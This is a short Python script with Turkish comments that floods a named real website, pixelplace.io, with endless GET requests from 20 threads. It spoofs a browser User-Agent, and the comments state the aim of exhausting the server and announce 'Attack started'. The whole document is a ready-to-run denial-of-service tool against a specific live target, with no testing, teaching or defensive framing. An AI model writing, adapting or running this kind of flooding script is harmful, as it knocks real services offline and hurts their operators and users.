import requests
import threading
import time

# Hedef URL'yi buraya yaz
TARGET = 'https://pixelplace.io/7-pixels-world-war'

def attack():
    while True:
        try:
            # Sunucuyu yormak için sürekli istek atıyoruz
            requests.get(TARGET, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Connection': 'keep-alive'
            })
        except Exception:
            pass

# 20 adet thread (iş parçacığı) oluştur
for _ in range(20):
    t = threading.Thread(target=attack)
    t.start()

print("Saldırı başlatıldı...")

# Sonsuz döngüde tutmak için
while True:
    time.sleep(10)
